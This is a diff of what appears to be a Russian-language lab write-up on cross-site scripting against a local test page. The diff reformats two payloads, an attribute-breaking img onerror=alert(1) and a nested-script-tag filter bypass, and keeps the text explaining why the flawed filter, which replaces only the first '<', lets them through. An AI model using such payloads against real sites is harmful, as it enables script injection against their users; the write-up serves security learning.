@@ -53,13 +53,17 @@ http://localhost:8080/index.html
 Exploitation (Burp Suite):
 
 Payload 1:
-```"><img src=x onerror=alert(1)>```
+```
+"><img src=x onerror=alert(1)>
+```
 
 Причина:
 Фильтр заменяет только первый "<". Строка закрывает атрибут, вставляет img, срабатывает onerror.
 
 Payload 2:
-```<scr<script>ipt>alert(1)</scr<script>ipt>```
+```
+<scr<script>ipt>alert(1)</scr<script>ipt>
+```
 
 Причина:
 Фильтр заменяет только первое "<". Вложенные теги остаются. Браузер склеивает теги и выполняет JS.
